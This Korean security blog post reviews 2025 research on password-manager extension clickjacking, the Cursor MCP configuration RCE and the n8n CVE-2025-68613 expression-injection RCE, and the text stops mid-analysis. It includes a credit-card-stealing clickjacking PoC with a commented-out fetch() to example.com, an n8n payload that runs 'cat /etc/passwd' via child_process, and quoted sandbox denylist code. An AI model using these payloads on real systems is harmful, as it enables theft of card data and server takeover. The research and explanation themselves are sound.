---
title: "[KR] Deep Dive into 2025 Security"
date: 2026-03-09 13:15:55
tags:
  - Research
  - Deep-Dive
  - Korean
  - Security
  - Web
language: kr
author: One, TCP/IP, filime
thumbnail: "/images/thumbnail/deep_research_2025_security.png"
copyright: |
  © 2026 HSPACE (References) Author: Rewrite Lab (One, TCP/IP, filime)
  This copyright applies to this document only.
---

# 들어가며 ...

2025년은 정말 다사다난했던 해라고 할 수 있다. 한국의 수많은 정부 기관과 사기업이 해킹당하며 한국의 보안의 실체가 낱낱히 드러났고 타 국가에서도 NPM 공급망 공격, 바이비트 해킹 사고, AI 해킹 등등 다양한 이슈가 발생했다. 그러나 이런 부정적인 사고만 있던 것은 결단코 아니다. 보안 분야에 종사하는 수많은 화이트해커분들과 연구원 분들 덕에 AI를 기반으로 보안의 패러다임을 다시 쓸 수 있었으며, 이전에 발굴되지 않았던 새로운 취약점, 공격기법 등이 발표되곤 했다. 이번 포스팅에선 25년도에 알려진 취약점, 해킹사고, 공격기법 등을 재조명하여 누구나 각 요소를 이해할 수 있도록 rewrite, 재작성하여 다룰 것이다.

## DOM-based Extension Click-Jacking

2025년 8월 9일, DEFCON 33에서 Click-Jacking 공격 기법에 대한 연구가 발표되었다. Click-Jacking(이하 클릭 재킹) 취약점은 이미 한참 전부터 버그바운티 등의 프로그램에서 “유효하지 않은 취약점”으로 간주되며 간단한 HTTP 헤더등을 추가하여 막을 수 있는 것으로 알려져왔다. 그래서 연구자는 “브라우저 확장 프로그램”을 대상으로 공격 연구를 진행 하였으며, 이중에서도 클릭 재킹 공격을 당했을 때 상당피 파급력이 큰 Password Manager 제품들을 대상으로 연구를 진행하였다. 해당 문단에서는 연구에서 소개된 기법들을 다시 정리해보며 그 원리와 내용에 대해 알아볼 예정이다.

원문 : https://marektoth.com/blog/dom-based-extension-clickjacking/

---

### Intrusive Web Elements

웹사이트를 탐색하다 보면 사용자는 본래 보고자 하는 콘텐츠에 즉시 접근하지 못하고, 먼저 특정 동작을 요구하는 방해 요소를 자주 마주하게 된다. 이러한 요소들은 사용자의 클릭을 유도하거나 강제하며, 현대 웹 환경에서는 일반적인 인터페이스 패턴으로 자리 잡았다.

대표적인 예시는 다음과 같다.

- 쿠키 동의 배너
  - 사이트 이용 전 쿠키 저장 여부를 선택하도록 요구하는 인터페이스
- 뉴스레터 팝업 또는 광고
  - 닫기 버튼을 눌러야 콘텐츠 접근 가능
- 웹 푸시 알림 요청
  - 알림 허용 또는 차단을 클릭해야 진행 가능
- 클라우드 기반 보안 챌린지 페이지 및 캡차
  - 사용자가 사람임을 검증하기 위한 클릭 요구

일반적으로 사용자는 콘텐츠에 접근하기 전 1~3회의 클릭을 수행하는 것이 자연적인 행동이 되었다.

연구자는 이 점에 주목하여, 사용자가 클릭을 의심하지 않는 환경을 조성한 뒤 보안 공격을 수행하는 구조를 연구하였다.

---

### Click-Jacking (Web Application)

- 클릭재킹
  - 사용자가 정상적인 인터페이스 요소를 클릭하고 있다고 착각하게 만든 뒤, 실제로는 보이지 않는 다른 UI 요소를 클릭하도록 유도하는 공격 기법

전통적인 클릭재킹 공격은 투명한 iframe을 이용해 공격 대상 웹사이트를 공격자 페이지 위에 겹쳐 올리는 방식으로 이루어진다.

기본 구조는 다음과 같다.

```html
<iframe src="https://targetsite.com" style="opacity:0"></iframe>
```

사용자는 눈에 보이는 버튼을 클릭하지만, 실제 클릭 이벤트는 투명한 iframe 내부의 사이트로 전달된다.

이를 방지하기 위해 웹 애플리케이션은 다음과 같은 보안 헤더를 사용하거나 [프레임 버스팅](https://docs.oracle.com/en/applications/jd-edwards/administration/9.2.x/eotsc/framebusting.html) 기법을 이용한다. 아래는 일반적으로 사용되는 보안 헤더이다.

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self';
```

또한 쿠키에는 SameSite 속성이 적용하여 방어하기도 한다.

```html
SameSite=Lax SameSite=Strict SameSite=None
```

SameSite 속성을 별개로 지정하지 않을 경우 기본 값은 Lax이며(Chromium 계열 브라우저 한정) 이 설정으로 인해 크로스 사이트 iframe에서는 인증 쿠키가 전달되지 않는다.

- 이는 Origin이 다른 사이트에서 iframe으로 특정 사이트를 열어봐야 쿠키는 전달되지 않는다는 뜻이다.
- Lax, Strict등에 대한 설명은 다음을 참조 : https://cookie-script.com/documentation/samesite-cookie-attribute-explained

---

연구자는 구조적으로 안전하게 방어된 웹 사이트 클릭재킹을 포기하고 다른 것으로 눈을 돌렸다. 그가 연구하기로 한 대상은 브라우저 확장 프로그램, 그중에서도 패스워드 매니저였다.

### Password Managers

패스워드 매니저는 브라우저 확장 형태로 널리 사용되며, 로그인 편의성을 제공한다.

해당 연구에서는 총 11개의 패스워드 매니저를 대상으로 실험이 진행되었다.

주요 테스트 대상은 다음과 같다.

- 1Password
- Bitwarden
- Dashlane
- Enpass
- Keeper
- LastPass
- LogMeOnce
- NordPass
- ProtonPass
- RoboForm
- iCloud Passwords

패스워드 매니저의 자동 입력 방식은 두 가지로 구분된다.

- 자동 자동완성
  - 사용자의 클릭 없이 입력 필드에 즉시 자격증명이 채워짐
- 수동 자동완성
  - 드롭다운 메뉴 또는 UI 선택을 통해 입력

![image.png](/[KR]%20Deep-research-of-2025-Security/image.png)

해당 연구는 클릭을 필요로 하는 수동 자동완성 방식에 초점을 맞추었다. 자동 자동완성에 대해서는 과거 연구에서 이미 위험성이 제기되었기 때문에 해당 연구에선 다루지 않은 듯 보인다.

- 참조 : https://marektoth.com/blog/password-managers-autofill/

---

### Browser Extension Click-Jacking

브라우저 확장에서도 클릭재킹은 가능하며, 이는 웹 애플리케이션과 유사하게 사용자의 클릭을 탈취해 확장 기능을 실행하도록 만든다.

이 공격은 다음 두 가지로 분류된다.

- iframe 기반 방식
  - Extension의 공개 리소스를 iframe으로 불러오는 방식
- DOM 기반 방식
  - Extension이 DOM에 삽입한 UI 요소를 직접 조작하는 방식

해당 연구의 핵심은 DOM 기반 방식이다.

---

### IFRAME-based Extension Clickjacking

Extension은 manifest 파일 설정을 통해 외부 웹페이지에서 해당 Extension에 접근 가능한 리소스를 지정할 수 있다. 이 설정이 부적절한 경우 공격자는 확장 UI를 iframe으로 불러올 수 있다.

```html
<iframe
  src="chrome-extension://<extension_ID>/file.html"
  style="opacity:0"
></iframe>
```

과거 일부 패스워드 매니저에서는 전체 UI가 iframe으로 로드 가능했으며 이를 통해 사용자의 모든 저장 데이터를 공유하거나 탈취할 수 있었다.

![취약한 설정의 Manifest](/[KR]%20Deep-research-of-2025-Security/image%201.png)

취약한 설정의 Manifest

![타 Origin에서 Extension 리소스를 로드한 모습](/[KR]%20Deep-research-of-2025-Security/image%202.png)

타 Origin에서 Extension 리소스를 로드한 모습

Manifest V3부터는 접근 가능한 출처를 제한할 수 있도록 개선되었다.

- 아래는 [`example.com/`](http://example.com/) 으로 도메인을 제한한 예시이다.

```json
"web_accessible_resources":[{"resources":["image.png","script.js"],"matches":["https://example.com/*"]}]
```

반면 이전 버전에서는 출처 제한이 존재하지 않았다.

```json
"web_accessible_resources":[{"resources":["image.png","script.js"]}]
```

---

### DOM-based Extension Clickjacking

DOM 기반 확장 클릭재킹은 확장이 웹페이지에 삽입한 UI 요소를 공격자가 직접 조작하여 투명하게 만들거나 덮어씌우는 방식이다.

![image.png](/[KR]%20Deep-research-of-2025-Security/image%203.png)

확장 UI는 iframe이 아니라 실제 DOM 요소이므로, 일반적인 보안 헤더의 보호를 받지 않는다.

공격 흐름은 다음과 같다.

1. 가짜 쿠키 배너 또는 캡차 생성
2. 로그인 또는 개인정보 입력 폼 생성
3. 폼을 거의 보이지 않게 설정
4. 입력 필드에 focus 설정
5. 패스워드 매니저 UI 자동 표시
6. 확장 UI 투명화
7. 이용자가 클릭(이용자가 클릭하는 요소는 광고 배너, 쿠키 허용 등의 평범한..) → 확장 UI 클릭 처리
8. 자동 입력된 정보 탈취

DOM 기반 확장 프로그램 클릭재킹은 다음과 같이 나눌 수 있다. 각 유형은 DOM 요소를 조작하는 방식이 다르지만 결과는 항상 동일하다. 즉, UI는 보이지 않지만 클릭 가능하게 된다.

```
DOM-basedExtensionClickjacking
├──ExtensionElement : Extension이 삽입한 요소를 조작
│   ├──RootElement : Extension UI의 최상위 컨테이너 조작
│   └──ChildElement : 최상위 컨테이너 내 버튼 하나, 패널 하나 등을 조작
├──ParentElement : Extension UI 전체를 조작 (투명화해서 클릭재킹 유도하는...)
│   ├──BODY : body 투명화
│   └──HTML : html 투명화
└──Overlay : 가짜 UI로 Overwrite
    ├──PartialOverlay : Extension UI의 일부를 덮음
    └──FullOverlay : Extension UI 전체를 덮음
```

나눠 놓으니 장황해보이지만, 결국 전체를 가리냐, 일부를 가리냐 정도의 차이로 이해하면 편하다.

---

### Extension Element – Root Element

Extension의 최상위 요소 자체를 투명하게 만드는 방식이다.

```jsx
document.querySelector("root-element").style.opacity = 0;
```

예시로 Proton Pass의 경우 다음과 같이 조작 가능하였다.

```jsx
document.querySelector("protonpass-root").style.opacity = 0.5;
```

![image.png](/[KR]%20Deep-research-of-2025-Security/image%204.png)

---

### Extension Element – Child Element

**background knowledge**

- shadow DOM 구조란 무엇인가?
  - 독립적인 DOM 트리를 생성하게 해주는 것
  - 아예 내부적으로 따로 적용되는 CSS, DOM 규칙을 생각하면 됨
- OPEN 모드 VS CLOSED 모드
- OPEN
  - 외부 JS 접근 가능
  - ex) `element.shadowRoot.querySelector(...)`
- CLOSED
  - 외부 접근 불가

Shadow DOM 모드가 open으로 설정된 경우 하위 요소에 접근하여 투명화 등의 조작이 가능하다.

```jsx
document.querySelector("child-element").style.opacity = 0;
```

동적 생성되는 루트 요소를 탐색한 후 내부 iframe을 조작할 수도 있다.

```jsx
const x = Array.from(document.querySelectorAll("*")).find((el) =>
  el.tagName.toLowerCase().startsWith("protonpass-root-"),
);
// protonpass-root-로 시작하는 모든 HTML 요소를 긁어와서

x.shadowRoot.querySelector("iframe").style.cssText += "opacity: 0 !important;";
```

![image.png](/[KR]%20Deep-research-of-2025-Security/image%205.png)

---

### Parent Element – BODY

확장이 삽입된 부모 요소인 body를 투명하게 만든다.

```jsx
document.body.style.opacity = 0;
document.documentElement.style.backgroundImage = url("website.png");
```

사이트 스크린샷을 배경으로 깔아 사용자가 정상 페이지로 인식하게 만든다.

![image.png](/[KR]%20Deep-research-of-2025-Security/image%206.png)

이 방식은 신용카드 입력 폼 등과 결합하여 자동완성 데이터를 직접 수집할 수 있다.

```jsx
// CREDIT CARD FORM
var cardform = document.getElementById("cardform");
if (!cardform) {
  cardform = document.createElement("cardform");
  cardform.id = "cardform";
  cardform.style =
    "position: fixed; bottom: 0px; left:0px; z-index: 2147483647; opacity:0.1";
  cardform.innerHTML = `<form method="post" name="card" onchange="getCardValues()" action="/" id="creditcard" autocomplete="off" novalidate="" style="opacity:0.1">
                <input type="text" id="cardnumber" name="cardnumber" placeholder="" autocomplete="cc-number new-password" maxlength="19" inputmode="numeric" pattern="\d*" style="cursor:pointer">
                <input type="text" id="expiry" placeholder="" autocomplete="off" inputmode="numeric" pattern="\d*" autofocus>
                <input type="text" name="cvc" id="cvc" placeholder="" autocomplete="cc-csc new-password" maxlength="3" inputmode="numeric" pattern="\d*">
                </form>`;
  document.body.appendChild(cardform);
}
// SET BACKGROUND-IMAGE
window.setTimeout(function () {
  document.querySelector("html").style.backgroundImage = "url(website.png)";
  document.getElementById("cardform").style =
    "position: fixed;top: 453px;left: 467px;z-index: 2147483647;";
  document.getElementById("cardnumber").focus();
  document.querySelector("body").style.opacity = "0.001";
}, 1000);

// GET DATA FROM INPUTS
function getCardValues() {
  var cardnumber = document.getElementById("cardnumber").value;
  var expiry = document.getElementById("expiry").value;
  var cvc = document.getElementById("cvc").value;
  if (expiry && cvc) {
    // DATA WILL BE IN CONSOLE
    console.log(
      "cardnumber=" + cardnumber + "&expiry=" + expiry + "&cvc=" + cvc,
    );

    /* Sending data to external server
            fetch("https://example.com/?cardnumber="+cardnumber+"&expiry="+expiry+"&cvc="+cvc,{mode:'no-cors'});
            */

    // AFTER STEALING DATA - OPACITY:1 FOR BODY
    cardform.style.display = "none";
    document.querySelector("body").style.opacity = "1";
    document.querySelector("html").style.backgroundImage = "";
  }
}
```

- 쿠키 배너 팝업을 보여주지만 실제로 “동의”버튼을 클릭 시 카드 폼이 자동완성 되어 공격자 서버로
  전송하는 로직을 포함한 코드(일련의 PoC이다.)

---

### Parent Element – HTML

html 요소 전체를 투명화한다.

```jsx
document.documentElement.style.opacity = 0;
```

사용자는 빈 화면을 클릭하도록 유도되는 게임형 인터페이스 등으로 속게 된다.

---

### Overlay – Partial Overlay

확장 UI 주변만 가리는 방식으로 일부 클릭 영역만 노출한다.

![image.png](/[KR]%20Deep-research-of-2025-Security/image%207.png)

공격자가 제작한 UI를 DOM 상 마지막 요소 및 최고 z-index 위치에 배치 하여 Extension UI 위에 덮는다.

- z-index 최상단은 가장 위에 보여진다는 뜻 (시각적으로)

이때 이용자가 가장 위에 보이는 공격자가 만든 UI를 클릭 시 그 클릭은 Extension UI가 클릭되도록 한다.

---

### Overlay – Full Overlay

확장 UI 전체를 덮되 클릭 이벤트를 통과시키는 방식이다.

```css
pointer-events: none;
```

Popover API를 이용해 항상 최상단 레이어로 유지할 수 있다.

- Popover API는 브라우저에서 제공하는 무조건 최상단 레이어 UI를 설정할 수 있게 해주는 기능

```jsx
document.getElementById("x").showPopover();
```

---

해당 연구에서 알려준 공격기법들은 위가 전부다. 그렇다면 실제 Password Manager Extension들은 얼마나 취약했을까? 그 결과는 놀라웠다.

![image.png](/[KR]%20Deep-research-of-2025-Security/image%208.png)

대부분의 Password Manager가 클릭재킹 공격에 취약했다. 1Password와 Bitwarden 같이 보안의 끝을 달리는 확장 프로그램도, 클릭재킹을 어느정도 방어할뿐 완전히 클릭재킹 공격을 방어하지 않고 있었다. 어쩌면 이러한 클릭재킹 취약점은 이미 실제 환경에서 활용되었을지도 모르는 일이다. 우리는 일반적으로 검색을 통해 접속하는 사이트에서 쿠키를 요구하면 별 생각없이 허용을 누르곤 한다. 만약 그 중 단 하나의 사이트라도 클릭 재킹 공격을 유도하고 있었다면 우리의 소중한 패스워드는 이미 블랙 해커의 자본이 되었을지도 모르는 일이다.

해당 문단에서는 클릭재킹 공격과 연구에서 사용된 기법의 핵심을 요점 위주로 정리하였으며, 실제 PoC 영상등은 포함하지 않았다. 따라서 공격의 결과와 상세한 임팩트가 궁금하다면 꼭 원문을 읽어보는 것을 추천한다.

https://marektoth.com/blog/dom-based-extension-clickjacking/#credit-card

## Cursor AI Code Editor RCE

https://thehackernews.com/2025/08/cursor-ai-code-editor-vulnerability.html

AI 열풍에 힘 입어 수많은 AI Agent, AI Tool가 바람처럼 나타났다가 사라지기를 반복했다. 수많은 도구의 탄생 속에서 그 두각을 드러낸 툴, 바로 Cursor였다. Cursor는 VSC를 포크하여 만들어진 통합 개발 환경으로 코드 생성, 분석 등 다양한 작업을 AI 기반으로 자동화 할 수 있도록 돕는다. 그러나 편리함 속에 치명적인 보안 취약점이 숨어 있었고, 무려 Remote Command Execution이라는 심각성을 지닌 CVE-2025-54136가 모습을 드러냈다.

### Cursor의 구성파일

CVE-2025-54136 Cursor(이하 커서) 코드 편집기 버전 1.2.4 이하에 영향을 미치는 RCE 취약점이다. 이 취약점은 2025년 7월 16일 Check Point Research를 통해 발견 되었으며, 10점 만점에 7.2점이라는 높은 CVSS 등급을 받은 이 취약점은 소프트웨어가 모델 컨텍스트 프로토콜(MCP) 서버 구성 변경을 처리하는 방식의 특이점 때문에 발견되었다.

**MCP서버 구성 변경 처리 방식**

커서는 시작 시 `~/.cursor/rules/mcp.json` 경로의 설정 파일을 참조하였다. 일반적으로 설정 파일은 다음과 같이 구성된다.

```json
"mcpServers": {
  "server-name": {
    "command": "npx",
    "args": ["server-package-name"],
    "env": {
      "API_KEY": "your-key"
    }
  }
}
}
```

이 시점에서 위험한 옵션이 보인다. `command`, `args`. 이는 커서 시작 시 실행할 명령어를 담는 필드이며, 별도의 검증 없이 실행된다는 특징이 있다. CVE-2025-54136는 이러한 점에 주목하였다. 공격자가 해당 구성 파일에 접근할 수 있는 경우 이용자의 호스트에서 커서가 실행될 때마다 악의적인 명령을 실행할 수 있다는 것이 CVE-2025-54136의 핵심이다.

**의문점**

그렇다면 자연스럽게 의문이 들 수 있다. 애초에 이용자 호스트의 로컬 파일에 접근할 수 있는 시점에서, 공격자는 이용자의 호스트를 장악한 게 아닌가? CVE-2025-54136에서 언급한 위험성은 일반 이용자가 Github 등에 업로드 된 MCP를 신뢰하였을 때, MCP 구성파일이 수정되어도 별도의 경고 없이 명령이 실행될 수 있다는 점이었다.

예를 들어 정상 MCP 개발자가 Github에 개발에 유용한 MCP를 업로드하고 관리한다고 가정하자. 이용자들은 편의성을 위해 MCP 서버를 다운 받고 신뢰할 것이고, 이후 정상 개발자의 계정 등이 탈취 당해 MCP 구성 파일이 악성 명령어로 변경된다면, 이용자들은 이미 MCP를 신뢰해버렸기 때문에 별도의 작업 없이 커서를 켜는 것만으로도 자신의 호스트에서 악성 명령을 실행하는 모양새가 된다. 즉 공급망 공격, 신뢰에 대한 CVE인 것이다.

비슷한 시나리오는 얼마든지 만들어질 수 있다. 처음부터 악의적인 공격자가 정상적인 도구인척 MCP를 업로드하고, 이용자가 많아졌을 때 MCP 구성파일을 수정하여 RCE를 달성할 수도 있다.

그렇다면 이런 이용자 신뢰로 벌어지는 문제점을 어떻게 패치하였을까?

**CVE-2025-54136** **패치**

https://github.com/cursor/cursor/security/advisories/GHSA-24mc-g4xr-4395

Cursor는 mcp 구성파일의 mcpServers필드가 수정될 때마다 이용자의 승인을 요구하도록 로직을 변경하였다.

변경점이 바로 반영되지 않고 이용자의 검증을 한번 거치도록 된 것이다. 물론 책임 소재를 이용자에게 전가한다는 점이 있지만, 최소한 눈이 먼 채 공격에 당하지 않을 수 있도록 취약점을 패치한 것이다.

요즘 AI를 이용한 공격과 더불어 피싱 공격, 공급망 공격, 또한 트로이 목마의 성향을 띄는 공격이 눈에 띄게 증가하였다. 심지어는 특정 CVE의 PoC에 악성 코드가 대놓고 심어지는 일도 있었으며, 공식 사이트를 사칭하여 관리자 계정을 탈취하고 공급망 공격을 수행하는 일도 있었다(NPM 공급망 사태 참고). 요즘 우리는 AI의 급속한 발전과 날마다 출시되는 새로운 도구들의 편의성에 눈이 멀어 보안을 망각한 채 신뢰할 수 없는 사이트를 함부로 접속하거나 툴을 다운받아 실행하는 일이 비일비재 해졌다. 그리고 공격자는 그런 틈을 노려 지금까지도 이익을 취하고 있다. 이러한 공격을 방지하기 위해 네트워크를 통해 접근 하는 모든 컨텐츠를 제로 트러스트라는 마음가짐 아래 다루어, 신뢰할 수 있는 도구만 사용할 수 있도록 해야 한다. 그렇지 않는다면 다음 해킹의 타겟은 우리가 될 수도 있다.

## What is n8n?

n8n(n-eight-n)은 오픈소스 기반의 워크플로우 자동화 플랫폼이다. 각 서비스와 애플리케이션 별로 존재하는 노드를 시각적 편집기로 편집하여 사용하기 때문에, 상대적으로 덜 복잡하고 비전공자도 손쉽게 여러 서비스와 애플리케이션을 연결하여 자동화 워크플로우를 구축할 수 있다.

시각적 편집기, 다양한 노드, 유연한 확장성, 오픈 소스, 셀프 호스팅 지원 등의 강력한 기능 제공과 장점으로 기존에 유료 서비스로 존재했던 자동화 워크플로우(Make, Zapier) 프레임워크보다 많은 인기를 얻고 있다.

![n8n 시각적 편집 도구 - [https://www.npmjs.com/package/n8n](https://www.npmjs.com/package/n8n)](/[KR]%20Deep-research-of-2025-Security/image%209.png)

n8n 시각적 편집 도구 - [https://www.npmjs.com/package/n8n](https://www.npmjs.com/package/n8n)

본문에서는 많은 인기를 얻고 있는 n8n에서 CVSS 9.9 점수로 발급된 Remote Code Execution(RCE) 취약점인 CVE-2025-68613의 루트커즈를 코드레벨에서 분석하여 원리와 파급력에 대해 연구해보고자 한다.

---

### 환경 구성 및 기본 기능 분석

필자는 디버깅을 용이하게 하기 위해, windows 환경에서 VScode Debugger를 사용하였다. `git clone`으로 CVE 패치 전 버전인 n8n@1.121.0 버전을 세팅하고, pnpm으로 패키지 설치 및 빌드를 진행하였다.

```bash
# git clone
git clone https://github.com/n8n-io/n8n.git
cd n8n
git checkout tags/n8n@1.121.0

# pnpm install
npm -g i pnpm

# pnpm install packages and build
pnpm i
pnpm build

# ELIFECYCLE  Command failed with exit code 1 에러 발생 시
# lefthook으로 githook 설치 스킵
set CI=true&& pnpm i
```

정상적으로 빌드된 이후, VScode의 `Launch n8n with debug` 옵션으로 실행하면 환경 구성은 완료된다. 디버깅 환경 구성은 n8n 프로젝트 파일 중 `.vscode` 폴더의 `DEBUGGER.md`에 상세하게 설명 되어있다.

![정상 세팅 후, n8n 메인화면](/[KR]%20Deep-research-of-2025-Security/image%2010.png)

정상 세팅 후, n8n 메인화면

### 기본 기능 분석

n8n에서 제공하는 자동화 워크플로우 UI 에디터 화면은 아래 이미지와 같다. 워크플로우의 시작 트리거 조건을 설정한 뒤, 트리거 되면 진행할 워크플로우를 노드 기반으로 구성한다.

![n8n 초기 화면](/[KR]%20Deep-research-of-2025-Security/image%2011.png)

n8n 초기 화면

간단한 테스트를 위해 **워크플로우 실행**을 실행 트리거로 설정, 워크플로우가 실행 되면 임의 JavaScript 코드를 실행하고, webhook으로 HTTP 요청을 보내도록 구성 및 테스트를 진행했다.

![워크플로우 테스트](/[KR]%20Deep-research-of-2025-Security/image%2012.png)

워크플로우 테스트

![워크플로우 실행 결과](/[KR]%20Deep-research-of-2025-Security/image%2013.png)

워크플로우 실행 결과

### Examine n8n vulnerability (**CVE-2025-68613)**

**CVE-2025-68613는 n8n에서 Expression Injection으로 인해 발생한 Remote Code Execution(RCE) 취약점이다.**

앞서 설명하였던 워크플로우 기능 중 Edit Fields(set) 노드에서 취약점이 발생하게 되었는데, Edit Fields 노드를 통해 새 데이터를 입력하거나 기존 데이터를 덮어 쓸 수 있다. 데이터를 입력할 때, JavaScript의 Expression(표현식)을 사용할 수 있는데, 이 기능에서 취약점이 발생하게 되었다.

![Edit Fields 설정 화면](/[KR]%20Deep-research-of-2025-Security/image%2014.png)

Edit Fields 설정 화면

Expression을 사용하게 되면 고정된 값이 아닌 JavaScript 코드를 실행한 결과값을 사용할 수 있다. 다만, 코드를 실행할 때, 적절한 입력 검증의 부재로 의도에서 벗어난 JavaScript 코드를 실행하여 OS Command를 실행할 수 있게 된다.

PoC 재현 순서는 다음과 같다.

```jsx
1. Edit Fields 노드 생성
2. 필드 세팅의 Expression(표현식) 기능을 사용하여 악의적인 JavaScript 코드 실행
3. RCE 발생
```

### Proof of Concept

`{{ (function(){ return this.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() })() }}`

---

### 워크플로우 실행 흐름 분석

워크플로우를 실행하거나, 워크플로우의 노드를 실행하면, `/:workflowId/run` 경로의 코드가 실행된다. 472번 줄의 `this.workflowExecutionService.executeManually` 함수에 실행 대상(워크플로우, 노드)과 유저 정보를 전달하게 된다.

![packages\cli\src\workflows\workflows.controller.ts 파일 / 450 ~ 477 lines](/[KR]%20Deep-research-of-2025-Security/image%2015.png)

packages\cli\src\workflows\workflows.controller.ts 파일 / 450 ~ 477 lines

**이후 함수 실행 흐름**

WorkflowsController.runManually

⇒ workflowRunner.run

⇒ runMainProcess

⇒ this.manualExecutionService.runManually

⇒ processRunExecutionData

…

⇒ workflow.expression.getPrameterValue

상기 함수 흐름 과정에서, 처음 노드부터 순차적으로 노드를 실행하며, 데이터 처리, 노드와 노드간의 데이터 연동 등의 과정을 거치게 된다.

각 노드 실행에는 노드 실행 간 사용되는 파라미터를 파싱하는 과정이 존재하며, `node-execution-context.ts`파일의 `NodeExecutionContext` 클래스에서 `workflow.expression.getPrameterValue` 메소드를 통해 전달된 노드 파라미터의 값(id, name, type 등)을 처리한다.

```jsx
export abstract class NodeExecutionContext implements Omit<FunctionsBase, 'getCredentials'> {
...

protected _getNodeParameter( // Node Parameter 값 파싱
		parameterName: string,
		itemIndex: number,
		// eslint-disable-next-line @typescript-eslint/no-explicit-any
		fallbackValue?: any,
		options?: IGetNodeParameterOptions,
	): NodeParameterValueType | object {
		const { workflow, node, mode, runExecutionData, runIndex, connectionInputData, executeData } =
			this;

		const nodeType = workflow.nodeTypes.getByNameAndVersion(node.type, node.typeVersion);

		// eslint-disable-next-line @typescript-eslint/no-unsafe-assignment
		const value = get(node.parameters, parameterName, fallbackValue);

		if (value === undefined) {
			throw new ApplicationError('Could not get parameter', { extra: { parameterName } });
		}

		if (options?.rawExpressions) {
			// eslint-disable-next-line @typescript-eslint/no-unsafe-return
			return value;
		}

		const { additionalKeys } = this;

		let returnData;

		try {
			returnData = workflow.expression.getParameterValue(
				// eslint-disable-next-line @typescript-eslint/no-unsafe-argument
				value, // <= Node's parameters like id, name, type etc...
				runExecutionData,
				runIndex,
				itemIndex,
				node.name,
				connectionInputData,
				mode,
				additionalKeys,
				executeData,
				false,
				{},
				options?.contextNode?.name,
			);
			cleanupParameterData(returnData);
		} catch (e) {


		...
```

이후, Expression 클래스의 `resolveSimpleParameterValue` 메소드에서 `isExpression` 함수를 통해, 파라미터 값이 Expression(표현식)인 경우 해당 표현식을 처리하여 그 값을 반환하도록 되어있다.

```jsx
export class Expression {
...

resolveSimpleParameterValue(
		parameterValue: NodeParameterValue,
		siblingParameters: INodeParameters,
		runExecutionData: IRunExecutionData | null,
		runIndex: number,
		itemIndex: number,
		activeNodeName: string,
		connectionInputData: INodeExecutionData[],
		mode: WorkflowExecuteMode,
		additionalKeys: IWorkflowDataProxyAdditionalKeys,
		executeData?: IExecuteData,
		returnObjectAsString = false,
		selfData = {},
		contextNodeName?: string,
	): NodeParameterValue | INodeParameters | NodeParameterValue[] | INodeParameters[] {
		// Check if it is an expression
		if (!isExpression(parameterValue)) {
			// Is no expression so return value
			return parameterValue;
		}

		// Is an expression

		// Remove the equal sign

	... // Expression will be executed at below codes.
```

이후, Expression은 `resolveSimpleParameterValue` 메소드에서 `renderExpression` 함수로 처리된다.

Expression 처리 전, 악의적인 코드가 포함된 표현식 처리(실행)를 방지하기 위해 입력 값 필터링 및 커스텀 sandboxing을 구현해두었고, Expression 실행 간, 입력 값 필터링 및 sandboxing 방식을 분석하여 PoC 코드가 동작하는 방식을 분석한다.

### 필터링 및 샌드박싱 코드 분석

`resolveSimpleParameterValue` 의 Expression 필터링 및 렌더링 부분은 아래와 같다.

```jsx
export class Expression {
...
resolveSimpleParameterValue(
...

		Expression.initializeGlobalContext(data); // HERE

		// expression extensions
		data.extend = extend;
		data.extendOptional = extendOptional;

		data[sanitizerName] = sanitizer; // HERE

		Object.assign(data, extendedFunctions);

		const constructorValidation = new RegExp(/\.\s*constructor/gm);
		if (parameterValue.match(constructorValidation)) { // HERE
			throw new ExpressionError('Expression contains invalid constructor function call', {
				causeDetailed: 'Constructor override attempt is not allowed due to security concerns',
				runIndex,
				itemIndex,
			});
		}

		// Execute the expression
		const extendedExpression = extendSyntax(parameterValue);
		const returnValue = this. renderExpression(extendedExpression, data);
		if (typeof returnValue === 'function') {
			if (returnValue.name === 'DateTime')
				throw new ApplicationError('this is a DateTime, please access its methods');

			throw new ApplicationError('this is a function, please add ()');
		} else if (typeof returnValue === 'string') {
			return returnValue;
		} else if (returnValue !== null && typeof returnValue === 'object') {
			if (returnObjectAsString) {
				return this.convertObjectValueToString(returnValue);
			}
		}

		return returnValue;
	}

...
```

위 코드 중, 주요 필터링 및 샌드박싱 처리 부분은 아래와 같고 각 코드 별 처리 방식을 분석한다.

```jsx
Expression.initializeGlobalContext(data);

data[sanitizerName] = sanitizer;

parameterValue.match(constructorValidation);
```

> Expression.initializeGlobalContext

`Expression.initializeGlobalContext(data);` 의 코드 중 일부는 아래와 같이 구성되어 있다.

```jsx
// packages\workflow\src\expression.ts / 53 ~ 86 lines
export class Expression {
	constructor(private readonly workflow: Workflow) {}

	static initializeGlobalContext(data: IDataObject) {
		/**
		 * Denylist
		 */

		data.document = {};
		data.global = {};
		data.window = {};
		data.Window = {};
		data.this = {};
		data.globalThis = {};
		data.self = {};

		// Alerts
		data.alert = {};
		data.prompt = {};
		data.confirm = {};

		// Prevent Remote Code Execution
		data.eval = {};
		data.uneval = {};
		data.setTimeout = {};
		data.setInterval = {};
		data.Function = {};

		// Prevent requests
		data.fetch = {};
		data.XMLHttpRequest = {};

		// Prevent control abstraction
		data.Promise = {};

		...
```

`Expression.initializeGlobalContext` 메소드의 인자로 들어온 객체의 메소드를 재정의하고 있다. document, global, window, this, Function 등의 키워드를 재정의 하는 것으로 **sandbox escaping과 악의적인 코드 실행을 방지**하는 것으로 파악된다. 이외에도 악의적으로 사용될 소지가 있는 객체들을 재정의하고 있다.

다만, 객체의 메소드를 재정의 하여 범위를 제한하는 방식은 분명한 한계가 존재한다. 해당 로직이 어떻게 Sandbox Escaping을 방지하는지 추후 sandbox 구현 방식을 분석하는 과정에서 더 상세히 설명하겠다.

> data[sanitizerName] = sanitizer;

`data[sanitizerName] = sanitizer;` 는 Expression을 실행 하기 직전 Expression에서 Prototype Pollution과 Sandbox Escaping으로 사용되는 Prototype 참조 객체를 재정의 하는 함수를 정의하는 부분이다.

```jsx
export const sanitizer = (value: unknown): unknown => {
	if (!isSafeObjectProperty(value as string)) {
		throw new ExpressionError(`Cannot access "${value as string}" due to security concerns`);
	}
	return value;
};

const unsafeObjectProperties = new Set(['__proto__', 'prototype', 'constructor', 'getPrototypeOf']);

export function isSafeObjectProperty(property: string) {
	return !unsafeObjectProperties.has(property);
}

```

`sanitizer` 함수에 들어온 문자열이 Prototype 관련 문자열인지 검사하는 로직이다.

